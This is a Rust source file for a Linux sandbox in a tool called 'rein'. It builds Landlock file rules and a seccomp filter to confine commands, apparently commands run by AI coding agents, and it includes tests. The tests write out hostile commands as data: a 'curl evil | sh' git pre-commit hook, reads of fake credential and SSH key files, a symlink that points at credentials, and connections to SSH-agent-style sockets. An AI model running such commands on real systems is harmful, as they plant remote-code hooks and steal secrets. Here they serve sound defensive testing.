//! Linux's sandbox: Landlock for files, and seccomp for sockets and a few
//! other ways out. rein builds the Landlock rules in its own process; the
//! command's process takes them on between fork and exec, before it runs
//! anything, so all that happens there is system calls on what's ready.
//! Nothing is allocated after the fork, which can deadlock.
//!
//! Landlock allows whole folders. It can't keep part of the project from a
//! command that may write the rest, so what's protected there is guarded
//! instead (see `guard`). Neither needs anything installed, nor the user
//! namespaces some systems turn off: only Linux 5.13 or later.

use std::io;
use std::os::fd::{AsRawFd, FromRawFd, OwnedFd, RawFd};
use std::path::{Path, PathBuf};

use crate::{Places, Walls};

/// Asks `landlock_create_ruleset` for the version instead of a ruleset.
const CREATE_RULESET_VERSION: u32 = 1;
const RULE_PATH_BENEATH: libc::c_int = 1;

// What Landlock can allow, by version (see linux/landlock.h).
const EXECUTE: u64 = 1 << 0;
const WRITE_FILE: u64 = 1 << 1;
const READ_FILE: u64 = 1 << 2;
const READ_DIR: u64 = 1 << 3;
const REMOVE_DIR: u64 = 1 << 4;
const REMOVE_FILE: u64 = 1 << 5;
const MAKE_DIR: u64 = 1 << 7;
const MAKE_REG: u64 = 1 << 8;
const MAKE_SOCK: u64 = 1 << 9;
const MAKE_FIFO: u64 = 1 << 10;
const MAKE_SYM: u64 = 1 << 12;
/// Version 2: moving and linking files between folders.
const REFER: u64 = 1 << 13;
/// Version 3.
const TRUNCATE: u64 = 1 << 14;
/// Version 5: `ioctl` on devices, terminals among them.
const IOCTL_DEV: u64 = 1 << 15;
/// Version 4: TCP.
const NET_BIND_TCP: u64 = 1 << 0;
const NET_CONNECT_TCP: u64 = 1 << 1;
/// Version 6: abstract Unix sockets and signals to processes outside.
const SCOPE_ABSTRACT_UNIX_SOCKET: u64 = 1 << 0;
const SCOPE_SIGNAL: u64 = 1 << 1;

const READ: u64 = EXECUTE | READ_FILE | READ_DIR;
/// In tools' records: files written, made and removed, but no link or
/// folder made, nor anything moved in from elsewhere (`REFER`).
const RECORD: u64 = WRITE_FILE | REMOVE_FILE | MAKE_REG | TRUNCATE;
const WRITE: u64 = WRITE_FILE | REMOVE_DIR | REMOVE_FILE | MAKE_DIR | MAKE_REG | MAKE_SOCK | MAKE_FIFO | MAKE_SYM | REFER | TRUNCATE;
/// What can be allowed on a file rather than a folder.
const ON_A_FILE: u64 = EXECUTE | WRITE_FILE | READ_FILE | TRUNCATE | IOCTL_DEV;

#[repr(C)]
struct RulesetAttr {
    handled_access_fs: u64,
    handled_access_net: u64,
    scoped: u64,
}

#[repr(C, packed)]
struct PathBeneathAttr {
    allowed_access: u64,
    parent_fd: i32,
}

/// The Landlock version this kernel has, or why there's none.
pub(super) fn version() -> Result<u32, String> {
    // SAFETY: asking for the version passes no attributes; nothing is
    // written anywhere.
    let version = unsafe { libc::syscall(libc::SYS_landlock_create_ruleset, std::ptr::null::<RulesetAttr>(), 0usize, CREATE_RULESET_VERSION) };
    match u32::try_from(version) {
        Ok(version) if version >= 1 => Ok(version),
        _ => Err(match io::Error::last_os_error().raw_os_error() {
            Some(libc::ENOSYS) => "this kernel has no Landlock; it came in Linux 5.13".to_owned(),
            Some(libc::EOPNOTSUPP) => "Landlock is turned off in this kernel".to_owned(),
            _ => format!("Landlock didn't answer: {}", io::Error::last_os_error()),
        }),
    }
}

/// Every right Landlock version `version` knows, so that none is left
/// allowed by not being named.
const fn handled(version: u32) -> u64 {
    let mut rights = (1 << 13) - 1;
    if version >= 2 {
        rights |= REFER;
    }
    if version >= 3 {
        rights |= TRUNCATE;
    }
    if version >= 5 {
        rights |= IOCTL_DEV;
    }
    rights
}

/// The Landlock rules for a command within `walls`, as a ruleset made in
/// rein's own process, for the command's to take on.
pub(super) fn ruleset(places: &Places, walls: Walls, version: u32) -> io::Result<OwnedFd> {
    let fs = handled(version);
    let attr = RulesetAttr {
        handled_access_fs: fs,
        // TCP refused without network access; seccomp refuses the rest.
        handled_access_net: if version >= 4 && !walls.network { NET_BIND_TCP | NET_CONNECT_TCP } else { 0 },
        scoped: if version >= 6 { SCOPE_ABSTRACT_UNIX_SOCKET | SCOPE_SIGNAL } else { 0 },
    };
    // Older kernels take only the fields they know.
    let size = match version {
        1..=3 => 8,
        4 | 5 => 16,
        _ => std::mem::size_of::<RulesetAttr>(),
    };
    // SAFETY: `attr` is a valid ruleset attribute of at least `size` bytes.
    let fd = unsafe { libc::syscall(libc::SYS_landlock_create_ruleset, &attr, size, 0u32) };
    let fd = RawFd::try_from(fd).ok().filter(|fd| *fd >= 0).ok_or_else(io::Error::last_os_error)?;
    // SAFETY: the kernel just gave us this descriptor, and nothing else has it.
    let ruleset = unsafe { OwnedFd::from_raw_fd(fd) };

    // Reading: everything but your home folder and what's hidden, and
    // devices one by one. Then what's readable in your home folder, but not
    // what's hidden there: Landlock allows only whole folders, so around it.
    let mut except = places.hidden().to_vec();
    except.extend(places.home().map(Path::to_path_buf));
    except.push(PathBuf::from("/dev"));
    let (mut whole, mut listed) = cover(Path::new("/"), &except);
    for place in places.readable().iter().chain(places.own()).chain(places.unhidden()) {
        let (more, more_listed) = cover(place, places.hidden());
        whole.extend(more);
        listed.extend(more_listed);
    }
    for path in &whole {
        allow(&ruleset, path, READ & fs)?;
    }
    for path in listed.iter().chain([&PathBuf::from("/dev")]) {
        allow(&ruleset, path, READ_DIR & fs)?;
    }
    for device in ["/dev/null", "/dev/zero", "/dev/full"] {
        allow(&ruleset, Path::new(device), (READ_FILE | WRITE_FILE | TRUNCATE) & fs)?;
    }
    for device in ["/dev/random", "/dev/urandom"] {
        allow(&ruleset, Path::new(device), READ_FILE & fs)?;
    }
    allow(&ruleset, Path::new("/dev/shm"), (READ | WRITE) & fs)?;

    // Writing: the temp folders, and with write access the project, but not
    // what's hidden in it, should the project be your home. Without write
    // access, not a project in a temp folder either: a rule on a folder
    // reaches all that's in it. Nor a home folder in one, which this would
    // make readable.
    let mut not_temp = places.hidden().to_vec();
    not_temp.extend(places.home().map(Path::to_path_buf));
    if !walls.write {
        not_temp.extend(places.writable().iter().cloned());
    }
    for temp in places.temp() {
        let (whole, _) = cover(temp, &not_temp);
        for path in &whole {
            allow(&ruleset, path, (READ | WRITE) & fs)?;
        }
    }
    // Its own folders, whatever its walls.
    for own in places.own() {
        let (whole, _) = cover(own, places.hidden());
        for path in &whole {
            allow(&ruleset, path, (READ | WRITE) & fs)?;
        }
    }
    // Tools' records, whatever its walls: what's settings in them is
    // guarded, as Landlock can't wall off part of a folder.
    for records in places.records() {
        let (whole, _) = cover(records, places.hidden());
        for path in &whole {
            allow(&ruleset, path, (READ | RECORD) & fs)?;
        }
    }
    if walls.write {
        // Not a project inside what's hidden: writing it would read it too.
        for writable in places.writable().iter().filter(|w| !places.hidden().iter().any(|hidden| w.starts_with(hidden))) {
            let (whole, _) = cover(writable, places.hidden());
            for path in &whole {
                allow(&ruleset, path, (READ | WRITE) & fs)?;
            }
        }
    }
    Ok(ruleset)
}

/// Adds a rule allowing `access` beneath `path`, if it exists.
fn allow(ruleset: &OwnedFd, path: &Path, access: u64) -> io::Result<()> {
    use std::os::unix::ffi::OsStrExt;
    let Ok(c_path) = std::ffi::CString::new(path.as_os_str().as_bytes()) else { return Ok(()) };
    // SAFETY: a NUL-terminated path; O_PATH opens nothing for reading.
    let fd = unsafe { libc::open(c_path.as_ptr(), libc::O_PATH | libc::O_CLOEXEC) };
    if fd < 0 {
        // Gone, or never there (no /dev/shm, say): nothing to allow.
        return Ok(());
    }
    // SAFETY: open just gave us this descriptor.
    let fd = unsafe { OwnedFd::from_raw_fd(fd) };
    let folder = std::fs::metadata(path).is_ok_and(|m| m.is_dir());
    let access = if folder { access } else { access & ON_A_FILE };
    if access == 0 {
        return Ok(());
    }
    let rule = PathBeneathAttr { allowed_access: access, parent_fd: fd.as_raw_fd() };
    // SAFETY: `rule` is a valid path-beneath attribute, and both
    // descriptors are open.
    let added = unsafe { libc::syscall(libc::SYS_landlock_add_rule, ruleset.as_raw_fd(), RULE_PATH_BENEATH, &rule, 0u32) };
    if added != 0 {
        return Err(io::Error::last_os_error());
    }
    Ok(())
}

/// What to allow whole so that everything under `top` is reached but
/// `except` and what's in it: `top` itself when nothing excepted is in it,
/// else the same for each thing in it. Also the folders gone into, which
/// may be listed though not wholly allowed. Symlinks are followed, so a
/// `/home` that's a link elsewhere can't take a hidden folder along.
fn cover(top: &Path, except: &[PathBuf]) -> (Vec<PathBuf>, Vec<PathBuf>) {
    let (mut whole, mut listed) = (Vec::new(), Vec::new());
    let mut look = vec![top.to_path_buf()];
    while let Some(path) = look.pop() {
        let Ok(path) = path.canonicalize() else { continue };
        if except.contains(&path) {
            continue;
        }
        if !except.iter().any(|e| e.starts_with(&path)) {
            whole.push(path);
            continue;
        }
        let Ok(entries) = std::fs::read_dir(&path) else { continue };
        look.extend(entries.flatten().map(|entry| entry.path()));
        listed.push(path);
    }
    whole.sort();
    whole.dedup();
    (whole, listed)
}

// The seccomp filter, as classic BPF.
const BPF_LD_W_ABS: u16 = 0x20;
const BPF_JMP_JEQ_K: u16 = 0x05 | 0x10;
#[cfg(target_arch = "x86_64")]
const BPF_JMP_JGE_K: u16 = 0x05 | 0x30;
const BPF_JMP_JSET_K: u16 = 0x05 | 0x40;
const BPF_RET_K: u16 = 0x06;
const RET_ALLOW: u32 = 0x7fff_0000;
const RET_ERRNO: u32 = 0x0005_0000;
/// Where `seccomp_data` keeps the call's number, its architecture, and
/// the low half of each argument (both architectures are little-endian).
const NR: u32 = 0;
const ARCH: u32 = 4;
const fn arg(n: u32) -> u32 {
    16 + 8 * n
}
#[cfg(target_arch = "x86_64")]
const AUDIT_ARCH: u32 = 0xc000_003e;
#[cfg(target_arch = "aarch64")]
const AUDIT_ARCH: u32 = 0xc000_00b7;
const TIOCLINUX: u32 = 0x541c;

const fn stmt(code: u16, k: u32) -> libc::sock_filter {
    libc::sock_filter { code, jt: 0, jf: 0, k }
}

const fn jump(code: u16, k: u32, jt: u8, jf: u8) -> libc::sock_filter {
    libc::sock_filter { code, jt, jf, k }
}

/// The seccomp filter for `walls`. It refuses:
/// - Unix sockets, always: through Docker's, a command could start a
///   container that mounts your home; through an SSH agent's, sign in.
/// - Internet sockets, without network access: UDP and DNS too, which
///   Landlock doesn't cover.
/// - Typing into a terminal (`TIOCSTI`, `TIOCLINUX`).
/// - New user namespaces, and io_uring, which can make sockets this filter
///   wouldn't see.
/// - Other architectures' system calls, numbered differently.
pub(super) fn filter(walls: Walls) -> Vec<libc::sock_filter> {
    let refuse = |errno: i32| stmt(BPF_RET_K, RET_ERRNO | (errno as u32 & 0xffff));
    let nr = |call: libc::c_long| u32::try_from(call).unwrap_or(u32::MAX);
    let mut program = vec![stmt(BPF_LD_W_ABS, ARCH), jump(BPF_JMP_JEQ_K, AUDIT_ARCH, 1, 0), refuse(libc::EPERM), stmt(BPF_LD_W_ABS, NR)];
    // x32's calls carry this bit, and would get past the numbers below.
    #[cfg(target_arch = "x86_64")]
    program.extend([jump(BPF_JMP_JGE_K, 0x4000_0000, 0, 1), refuse(libc::EPERM)]);
    program.extend([jump(BPF_JMP_JEQ_K, nr(libc::SYS_io_uring_setup), 0, 1), refuse(libc::EPERM)]);
    program.extend([jump(BPF_JMP_JEQ_K, nr(libc::SYS_unshare), 0, 1), refuse(libc::EPERM)]);
    // clone3 hides its flags in memory; ENOSYS makes libc use clone.
    program.extend([jump(BPF_JMP_JEQ_K, nr(libc::SYS_clone3), 0, 1), refuse(libc::ENOSYS)]);
    #[allow(clippy::cast_sign_loss)]
    let new_user = libc::CLONE_NEWUSER as u32;
    program.extend([
        jump(BPF_JMP_JEQ_K, nr(libc::SYS_clone), 0, 4),
        stmt(BPF_LD_W_ABS, arg(0)),
        jump(BPF_JMP_JSET_K, new_user, 0, 1),
        refuse(libc::EPERM),
        stmt(BPF_RET_K, RET_ALLOW),
    ]);
    #[allow(clippy::cast_possible_truncation)]
    let tiocsti = libc::TIOCSTI as u32;
    program.extend([
        jump(BPF_JMP_JEQ_K, nr(libc::SYS_ioctl), 0, 5),
        stmt(BPF_LD_W_ABS, arg(1)),
        jump(BPF_JMP_JEQ_K, tiocsti, 1, 0),
        jump(BPF_JMP_JEQ_K, TIOCLINUX, 0, 1),
        refuse(libc::EPERM),
        stmt(BPF_RET_K, RET_ALLOW),
    ]);
    #[allow(clippy::cast_sign_loss)]
    let refused: Vec<u32> = if walls.network { vec![libc::AF_UNIX as u32] } else { vec![libc::AF_UNIX as u32, libc::AF_INET as u32, libc::AF_INET6 as u32] };
    let checks = u8::try_from(refused.len()).unwrap_or(u8::MAX);
    program.extend([jump(BPF_JMP_JEQ_K, nr(libc::SYS_socket), 0, checks + 3), stmt(BPF_LD_W_ABS, arg(0))]);
    for (i, family) in refused.iter().enumerate() {
        let left = checks - 1 - u8::try_from(i).unwrap_or(0);
        program.push(jump(BPF_JMP_JEQ_K, *family, left + 1, 0));
    }
    program.extend([stmt(BPF_RET_K, RET_ALLOW), refuse(libc::EPERM)]);
    program.push(stmt(BPF_RET_K, RET_ALLOW));
    program
}

/// Takes on `ruleset` and `filter`: in the command's process, between fork
/// and exec. Only system calls, on what's ready.
pub(super) fn confine(ruleset: RawFd, filter: &[libc::sock_filter]) -> io::Result<()> {
    // SAFETY: prctl, landlock_restrict_self and seccomp are system calls,
    // safe between fork and exec; `ruleset` is open (the parent keeps it
    // until the command has started), and `program` points at `filter`,
    // which lives as long as this call.
    unsafe {
        if libc::prctl(libc::PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) != 0 {
            return Err(io::Error::last_os_error());
        }
        if libc::syscall(libc::SYS_landlock_restrict_self, ruleset, 0u32) != 0 {
            return Err(io::Error::last_os_error());
        }
        let program = libc::sock_fprog { len: u16::try_from(filter.len()).unwrap_or(u16::MAX), filter: filter.as_ptr().cast_mut() };
        if libc::syscall(libc::SYS_seccomp, libc::SECCOMP_SET_MODE_FILTER, 0u32, &program) != 0 {
            return Err(io::Error::last_os_error());
        }
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::Sandbox;

    const LOOK: Walls = Walls { write: false, network: false };
    const WRITE: Walls = Walls { write: true, network: false };
    const NET: Walls = Walls { write: true, network: true };

    /// A folder for a test: in `$REIN_TEST_DIR` where it's set (the test
    /// container sets one outside the temp folders, as a real project is).
    fn dir(name: &str) -> PathBuf {
        let base = std::env::var_os("REIN_TEST_DIR").map_or_else(std::env::temp_dir, PathBuf::from);
        let dir = base.join(format!("landlock-{name}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        crate::places::resolve(&dir)
    }

    struct Setup {
        root: PathBuf,
        home: PathBuf,
        outside: PathBuf,
        sandbox: Sandbox,
    }

    async fn setup(name: &str) -> Option<Setup> {
        let root = dir(name);
        let (home, outside) = (dir(&format!("{name}-home")), dir(&format!("{name}-outside")));
        std::fs::create_dir_all(root.join(".git/hooks")).unwrap();
        std::fs::write(root.join("readme.txt"), "hello\n").unwrap();
        std::fs::create_dir_all(home.join(".ssh")).unwrap();
        std::fs::write(home.join(".ssh/id_test"), "secret\n").unwrap();
        std::fs::write(home.join("notes.txt"), "mine\n").unwrap();
        let sandbox = Sandbox::detect(Places::new(&root, Some(&home), None)).await;
        if !sandbox.available() {
            eprintln!("no sandbox here: {}", sandbox.describe());
        }
        sandbox.available().then_some(Setup { root, home, outside, sandbox })
    }

    async fn run(s: &Setup, line: &str, walls: Walls) -> (bool, String) {
        let mut command = s.sandbox.wrap(line, walls).expect("a sandbox, since setup found one");
        let output = command.current_dir(&s.root).stdin(std::process::Stdio::null()).output().await.unwrap();
        (output.status.success(), format!("{}{}", String::from_utf8_lossy(&output.stdout), String::from_utf8_lossy(&output.stderr)))
    }

    fn python() -> bool {
        std::process::Command::new("python3").arg("-c").arg("1").status().is_ok_and(|s| s.success())
    }

    #[tokio::test]
    async fn look_reads_but_changes_nothing() {
        let Some(s) = setup("look").await else { return };
        assert_eq!(run(&s, "cat readme.txt", LOOK).await, (true, "hello\n".to_owned()));
        assert!(!run(&s, "echo x > new.txt", LOOK).await.0);
        assert!(!s.root.join("new.txt").exists());
        assert!(run(&s, "echo x > /tmp/rein-landlock-look-$$ && rm /tmp/rein-landlock-look-$$", LOOK).await.0);
    }

    #[tokio::test]
    async fn look_cant_write_a_project_in_a_temp_folder() {
        let root = crate::places::resolve(&std::env::temp_dir()).join(format!("rein-landlock-temp-project-{}", std::process::id()));
        std::fs::create_dir_all(&root).unwrap();
        let sandbox = Sandbox::detect(Places::new(&root, None, None)).await;
        if !sandbox.available() {
            return;
        }
        let s = Setup { root: root.clone(), home: root.clone(), outside: root.clone(), sandbox };
        assert!(!run(&s, "echo x > new.txt", LOOK).await.0, "a rule on /tmp reaches the project in it");
        assert!(run(&s, "echo x > new.txt", WRITE).await.0);
    }

    #[tokio::test]
    async fn write_changes_the_project_and_nothing_else() {
        let Some(s) = setup("write").await else { return };
        assert!(run(&s, "mkdir -p src && echo x > src/new.txt && mv src/new.txt moved.txt", WRITE).await.0);
        assert!(s.root.join("moved.txt").exists());
        let outside = s.outside.join("planted.txt");
        assert!(!run(&s, &format!("echo x > '{}'", outside.display()), WRITE).await.0);
        assert!(!run(&s, &format!("echo x > '{}'", s.home.join(".profile").display()), WRITE).await.0);
        assert!(!outside.exists() && !s.home.join(".profile").exists());
    }

    /// Claude Code keeps its skills, and the plugins you install, among its
    /// logins and settings, all hidden: a skill's script is read, and
    /// nothing else there, nor through a link from a skill.
    #[tokio::test]
    async fn skills_in_a_hidden_folder_are_read_and_nothing_else_there() {
        let Some(s) = setup("skills").await else { return };
        let claude = s.home.join(".claude");
        for (file, text) in [
            ("skills/graphs/run.sh", "echo drawn\n"),
            ("plugins/cache/market/kit/1.0.0/skills/lint/SKILL.md", "lint\n"),
            (".credentials.json", "FAKE-token\n"),
            ("plugins/data/kit/token", "FAKE-data\n"),
            ("settings.json", "{}\n"),
        ] {
            std::fs::create_dir_all(claude.join(file).parent().unwrap()).unwrap();
            std::fs::write(claude.join(file), text).unwrap();
        }
        std::os::unix::fs::symlink(claude.join(".credentials.json"), claude.join("skills/graphs/leak")).unwrap();
        let (worked, said) = run(&s, &format!("sh '{}'", claude.join("skills/graphs/run.sh").display()), LOOK).await;
        assert!(worked && said.trim() == "drawn", "{said}");
        assert!(run(&s, &format!("cat '{}'", claude.join("plugins/cache/market/kit/1.0.0/skills/lint/SKILL.md").display()), LOOK).await.0);
        for secret in [".credentials.json", "plugins/data/kit/token", "settings.json", "skills/graphs/leak"] {
            let (worked, said) = run(&s, &format!("cat '{}'", claude.join(secret).display()), NET).await;
            assert!(!worked && !said.contains("FAKE"), "{secret}: {said}");
        }
        assert!(!run(&s, &format!("echo x > '{}'", claude.join("skills/graphs/run.sh").display()), WRITE).await.0, "read, never changed");
        let places = s.sandbox.places();
        assert!(
            !places.hides(&claude.join("skills/graphs/run.sh")) && places.hides(&claude.join(".credentials.json")) && places.hides(&claude.join("skills/graphs/leak")),
            "rein's own tools agree"
        );
    }

    #[tokio::test]
    async fn the_home_folder_cant_be_read_but_for_what_tools_need() {
        let Some(s) = setup("hidden").await else { return };
        std::fs::create_dir_all(s.home.join(".cargo")).unwrap();
        std::fs::write(s.home.join(".cargo/config.toml"), "[build]\n").unwrap();
        std::fs::write(s.home.join(".cargo/credentials.toml"), "FAKE-token\n").unwrap();
        std::fs::write(s.home.join(".bashrc"), "export FAKE_KEY=FAKE-key\n").unwrap();
        for secret in [".ssh/id_test", "notes.txt", ".bashrc", ".cargo/credentials.toml"] {
            assert!(!run(&s, &format!("cat '{}'", s.home.join(secret).display()), NET).await.0, "{secret}");
        }
        // Its folders can still be listed: Landlock lets a command list `/`
        // only by letting it list every folder in it.
        assert!(run(&s, &format!("cat '{}'", s.home.join(".cargo/config.toml").display()), LOOK).await.0);
        std::fs::write(s.outside.join("notes.txt"), "theirs\n").unwrap();
        assert!(run(&s, &format!("cat '{}'", s.outside.join("notes.txt").display()), LOOK).await.0, "outside it, as before");
    }

    #[tokio::test]
    async fn other_processes_are_out_of_reach() {
        let Some(s) = setup("processes").await else { return };
        let mut other = std::process::Command::new("sleep").arg("30").env("REIN_TEST_SECRET", "hunter2").spawn().unwrap();
        let pid = other.id();
        // Its environment, as /proc gives it to anyone allowed to trace it.
        let (_, said) = run(&s, &format!("cat /proc/{pid}/environ"), NET).await;
        assert!(!said.contains("hunter2"), "{said}");
        // Signals, where the kernel can keep them in (Landlock 6).
        if version().is_ok_and(|v| v >= 6) {
            assert!(!run(&s, &format!("kill -0 {pid}"), NET).await.0, "signalled a process outside");
        }
        let _ = other.kill();
        let _ = other.wait();
    }

    #[tokio::test]
    async fn the_network_takes_network_access_and_other_programs_sockets_stay_closed() {
        let Some(s) = setup("network").await else { return };
        if !python() {
            return;
        }
        let server = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
        let port = server.local_addr().unwrap().port();
        std::thread::spawn(move || {
            for socket in server.incoming() {
                drop(socket);
            }
        });
        let reach = format!("python3 -c 'import socket; socket.create_connection((\"127.0.0.1\", {port}), 2)'");
        assert!(!run(&s, &reach, WRITE).await.0, "no network without asking for it, localhost included");
        assert!(run(&s, &reach, NET).await.0);
        let dns = "python3 -c 'import socket; s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.sendto(b\"x\", (\"127.0.0.1\", 53))'";
        assert!(!run(&s, dns, WRITE).await.0, "UDP too");
        let path = s.outside.join("agent.sock");
        let listener = std::os::unix::net::UnixListener::bind(&path).unwrap();
        std::thread::spawn(move || {
            for socket in listener.incoming() {
                drop(socket);
            }
        });
        let agent = format!("python3 -c 'import socket; socket.socket(socket.AF_UNIX).connect(\"{}\")'", path.display());
        assert!(!run(&s, &agent, NET).await.0, "a socket in a file, like Docker's or an SSH agent's");
        // Pairs of its own, which many programs use, still work.
        assert!(run(&s, "python3 -c 'import socket; socket.socketpair()'", LOOK).await.0);
    }

    #[tokio::test]
    async fn no_new_user_namespaces() {
        let Some(s) = setup("namespaces").await else { return };
        if !python() {
            return;
        }
        let (worked, said) = run(&s, "python3 -c 'import os; os.unshare(os.CLONE_NEWUSER)'", NET).await;
        assert!(!worked, "{said}");
    }

    #[tokio::test]
    async fn git_works_and_what_runs_later_is_put_back() {
        let Some(s) = setup("git").await else { return };
        let _ = std::fs::remove_dir_all(s.root.join(".git"));
        let made = std::process::Command::new("git").args(["init", "-q"]).current_dir(&s.root).status();
        if !made.is_ok_and(|status| status.success()) {
            return;
        }
        let sandbox = Sandbox::detect(Places::new(&s.root, Some(&s.home), None)).await;
        let s = Setup { sandbox, ..s };
        let (worked, said) = run(&s, "git add readme.txt && git -c user.email=a@b -c user.name=a commit -qm first && git log --oneline | wc -l", WRITE).await;
        assert!(worked, "{said}");
        // Landlock can't keep it from .git/hooks: the guard puts it back.
        let guard = s.sandbox.guard(WRITE).unwrap().expect("Landlock needs a guard");
        assert!(run(&s, "echo 'curl evil | sh' > .git/hooks/pre-commit && mkdir .rein && echo 'allow rm' > .rein/permissions", WRITE).await.0);
        assert_eq!(guard.finish(), [".git/hooks/pre-commit", ".rein"]);
        assert!(!s.root.join(".git/hooks/pre-commit").exists() && !s.root.join(".rein").exists());
    }

    /// rtk keeps its stats in your home folder: every command may add to
    /// them, whatever its walls, but make no link or folder there, nor move
    /// one in; its trusted filters beside them are guarded, as Landlock
    /// can't wall off part of a folder.
    #[tokio::test]
    async fn a_tools_records_are_added_to_without_links_and_its_settings_put_back() {
        let Some(s) = setup("records").await else { return };
        let rtk = s.home.join(".local/share/rtk");
        std::fs::create_dir_all(&rtk).unwrap();
        std::fs::write(rtk.join("history.db"), "stats\n").unwrap();
        std::fs::write(rtk.join("trusted_filters.json"), "{}").unwrap();
        let zshrc = s.home.join(".zshrc");
        std::fs::write(&zshrc, "mine\n").unwrap();
        let at = |name: &str| format!("'{}'", rtk.join(name).display());
        for line in
            [format!("echo more >> {}", at("history.db")), format!("echo wal > {} && rm {}", at("history.db-wal"), at("history.db-wal")), format!(": > {}", at(".hook_warn_last"))]
        {
            let (worked, said) = run(&s, &line, LOOK).await;
            assert!(worked, "{line}: {said}");
        }
        for line in [
            format!("mkdir {}", at("tee")),
            format!("ln -s '{}' {}", zshrc.display(), at("history.db-journal")),
            format!(
                "ln -s '{}' /tmp/rein-landlock-records-$$ && mv /tmp/rein-landlock-records-$$ {}; worked=$?; rm -f /tmp/rein-landlock-records-$$; exit $worked",
                zshrc.display(),
                at("history.db-shm")
            ),
        ] {
            let (worked, said) = run(&s, &line, LOOK).await;
            assert!(!worked, "{line} worked: {said}");
        }
        let guard = s.sandbox.guard(LOOK).unwrap().expect("Landlock needs a guard, even to look");
        assert!(run(&s, &format!("echo '{{\"evil\": true}}' > {}", at("trusted_filters.json")), LOOK).await.0);
        assert_eq!(guard.finish(), [rtk.join("trusted_filters.json").display().to_string()]);
        assert_eq!(std::fs::read_to_string(rtk.join("trusted_filters.json")).unwrap(), "{}", "put back");
        assert!(std::fs::read_to_string(rtk.join("history.db")).unwrap().ends_with("more\n"));
        assert_eq!(std::fs::read_to_string(&zshrc).unwrap(), "mine\n");
    }

    #[test]
    fn the_filter_refuses_what_it_says() {
        let has = |program: &[libc::sock_filter], k: libc::c_long| program.iter().any(|i| i.k == u32::try_from(k).unwrap_or(0));
        let off = filter(LOOK);
        for call in [libc::SYS_io_uring_setup, libc::SYS_unshare, libc::SYS_clone3, libc::SYS_socket, libc::SYS_ioctl] {
            assert!(has(&off, call), "{call}");
        }
        #[allow(clippy::cast_sign_loss)]
        let family = |f: i32| f as u32;
        assert!(off.iter().any(|i| i.k == family(libc::AF_INET6)), "no internet without network access");
        assert!(!filter(NET).iter().any(|i| i.k == family(libc::AF_INET6)), "with it, the internet");
        assert!(filter(NET).iter().any(|i| i.k == family(libc::AF_UNIX)), "other programs' sockets, never");
    }
}
